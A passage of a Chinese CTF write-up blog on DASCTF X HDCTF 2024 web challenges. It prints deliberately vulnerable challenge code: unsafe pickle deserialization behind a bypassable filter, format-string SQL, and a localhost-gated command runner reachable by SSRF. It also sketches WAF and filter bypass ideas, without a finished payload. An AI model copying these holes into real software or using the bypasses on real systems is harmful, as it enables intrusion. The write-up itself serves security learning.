keyword">as</span> cur<span class="token punctuation">:</span>                sql <span class="token operator">=</span> <span class="token string">'insert into wishes(`id`, `wish`) values (&#123;id&#125;, "&#123;wish&#125;")'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                    <span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">,</span> wish<span class="token operator">=</span>wish<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">await</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">rmWishes</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pool <span class="token operator">=</span> request<span class="token punctuation">.</span>app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> pool<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cur<span class="token punctuation">:</span>                sql <span class="token operator">=</span> <span class="token string">'delete from wishes'</span>                <span class="token keyword">await</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">hint</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        source <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>source<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> web<span class="token punctuation">.</span>Application<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">]</span> <span class="token operator">=</span> config    app<span class="token punctuation">.</span>router<span class="token punctuation">.</span>add_static<span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> path<span class="token operator">=</span><span class="token string">'./static'</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>add_routes<span class="token punctuation">(</span><span class="token punctuation">[</span>web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">,</span>                    web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/waf'</span><span class="token punctuation">,</span> waf<span class="token punctuation">)</span><span class="token punctuation">,</span>                    web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/addWishes'</span><span class="token punctuation">,</span> addWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                    web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/getWishes'</span><span class="token punctuation">,</span> getWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                    web<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'/rmWishes'</span><span class="token punctuation">,</span> rmWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                    web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/hint'</span><span class="token punctuation">,</span> hint<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    app <span class="token operator">=</span> mysql_init<span class="token punctuation">(</span>app<span class="token punctuation">)</span>    web<span class="token punctuation">.</span>run_app<span class="token punctuation">(</span>app<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到aiohttp&#x2F;3.8.4</p><p>尝试<a href="https://github.com/wy876/POC/blob/main/aiohttp%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E(CVE-2024-23334).md">CVE-2024-23334</a>失败，因为这里是<code>app.router.add_static(&#39;/static&#39;, path=&#39;./static&#39;)</code>，没开<code>follow_symlinks</code></p><p>审一下代码</p><p>最终利用点应该是pickle反序列化，即<code>getWishes</code>方法里的<code>wishes.append(pickle.loads(base64.b64decode(wish)))</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">getWishes</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    wishes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token builtin">id</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pool <span class="token operator">=</span> request<span class="token punctuation">.</span>app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> pool<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cur<span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    sql <span class="token operator">=</span> <span class="token string">'select id,wish from wishes where id=&#123;id&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                        <span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">)</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    sql <span class="token operator">=</span> <span class="token string">'select id,wish from wishes'</span>                <span class="token keyword">await</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                datas <span class="token operator">=</span> <span class="token keyword">await</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span> wish<span class="token punctuation">)</span> <span class="token keyword">in</span> datas<span class="token punctuation">:</span>        <span class="token keyword">if</span> check<span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">:</span>            wishes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>wishes<span class="token punctuation">)</span><span class="token punctuation">,</span> content_type<span class="token operator">=</span><span class="token string">"application/json"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来往前看条件，首先是<code>check</code>方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'i'</span><span class="token punctuation">,</span> <span class="token string">b'o'</span><span class="token punctuation">,</span> <span class="token string">b'b'</span><span class="token punctuation">,</span> <span class="token string">b'V'</span><span class="token punctuation">,</span> <span class="token string">b'__setstate__'</span><span class="token punctuation">]</span>    white_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'__main__'</span><span class="token punctuation">,</span> <span class="token string">b'builtins'</span><span class="token punctuation">,</span> <span class="token string">b'contact'</span><span class="token punctuation">,</span> <span class="token string">b'time'</span><span class="token punctuation">,</span> <span class="token string">b'dict'</span><span class="token punctuation">,</span> <span class="token string">b'reason'</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> white_list<span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>限制了黑名单和白名单，白名单是替换为空，很明显可以用双写绕过</p><p>然后是前面的数据库查询，传入参数查询数据库，把查询结果中的<code>wish</code>取出来，那么我们首先得想办法往数据库里插入pickle语句</p><p>那么就是<code>addWishes</code>方法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">addWishes</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"contact"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"place"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"reason"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"date"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">"contact"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"contact"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"place"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"place"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"reason"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"reason"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"date"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"date"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"timestamp"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>        <span class="token builtin">id</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>        wish <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pool <span class="token operator">=</span> request<span class="token punctuation">.</span>app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> pool<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cur<span class="token punctuation">:</span>                sql <span class="token operator">=</span> <span class="token string">'insert into wishes(`id`, `wish`) values (&#123;id&#125;, "&#123;wish&#125;")'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                    <span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">,</span> wish<span class="token operator">=</span>wish<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">await</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入的data会以pickle字符串传入到数据库中</p><p>但是这里有一个问题</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>add_routes<span class="token punctuation">(</span><span class="token punctuation">[</span>web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">,</span>                web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/waf'</span><span class="token punctuation">,</span> waf<span class="token punctuation">)</span><span class="token punctuation">,</span>                web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/addWishes'</span><span class="token punctuation">,</span> addWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/getWishes'</span><span class="token punctuation">,</span> getWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                web<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'/rmWishes'</span><span class="token punctuation">,</span> rmWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/hint'</span><span class="token punctuation">,</span> hint<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们访问&#x2F;addWishes的时候会触发waf</p><p><img src="/blog/2024/06/02/DASCTF-X-HDCTF-2024/image-20240602112659615.png" alt="image-20240602112659615"></p><p>猜测得从aiohttp自身的漏洞出发思考绕过方式</p><p>稍微搜一下发现 aiohttp(yarl) 会对 url 部分字符自动 urldecode：<a href="https://blog.csdn.net/qq_31720329/article/details/82024036">https://blog.csdn.net/qq_31720329/article/details/82024036</a></p><p>本地测试也发现会自动urldecode</p><p><img src="/blog/2024/06/02/DASCTF-X-HDCTF-2024/image-20240602162110539.png" alt="image-20240602162110539"></p><p>但是进不去&#x2F;addWishes路由。。可以发现它进入路由是在urldecode之前，然后path的值为urldecode之后</p><hr><h2 id="RceHouse-Unsolved"><a href="#RceHouse-Unsolved" class="headerlink" title="RceHouse (Unsolved)"></a>RceHouse (Unsolved)</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocess<span class="token keyword">import</span> clickhouse_connect<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>client <span class="token operator">=</span> clickhouse_connect<span class="token punctuation">.</span>get_client<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8123</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">'default'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/status"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">"POST"</span><span class="token punctuation">:</span>        remote_addr <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        <span class="token keyword">print</span><span class="token punctuation">(</span>remote_addr<span class="token punctuation">)</span>        <span class="token keyword">if</span> remote_addr<span class="token operator">==</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">:</span>            command <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"clickhouse-client"</span><span class="token punctuation">,</span> <span class="token string">"--query"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'param'</span><span class="token punctuation">)</span> <span class="token punctuation">]</span>            result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>command<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"clickhouse-client --query=\"select 'try harder'\""</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"clickhouse-client --query=\"select 'try better'\""</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/sql"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sql</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#此处是clickhouse的查询语法，不存在注入问题</span>        sql <span class="token operator">=</span> <span class="token string">'SELECT * FROM ctf.users WHERE id = '</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>        res<span class="token operator">=</span>client<span class="token punctuation">.</span>command<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>        client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> e<span class="token punctuation">;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    filename <span class="token operator">=</span> <span class="token string">"Boogipop"</span>    file_path <span class="token operator">=</span><span class="token string">"/tmp/"</span><span class="token operator">+</span>filename    <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>    <span class="token keyword">return</span> file_path<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审一下代码，总共就三个路由</p><p>&#x2F;status路由：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/status"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">"POST"</span><span class="token punctuation">:</span>        remote_addr <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        <span class="token keyword">print</span><span class="token punctuation">(</span>remote_addr<span class="token punctuation">)</span>        <span class="token keyword">if</span> remote_addr<span class="token operator">==</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">:</span>            command <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"clickhouse-client"</span><span class="token punctuation">,</span> <span class="token string">"--query"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'param'</span><span class="token punctuation">)</span> <span class="token punctuation">]</span>            result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>command<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"clickhouse-client --query=\"select 'try harder'\""</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"clickhouse-client --query=\"select 'try better'\""</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼打ssrf然后命令执行</p><p>&#x2F;sql路由：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/sql"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sql</span><span class="token punctuation">(</span><span class="token 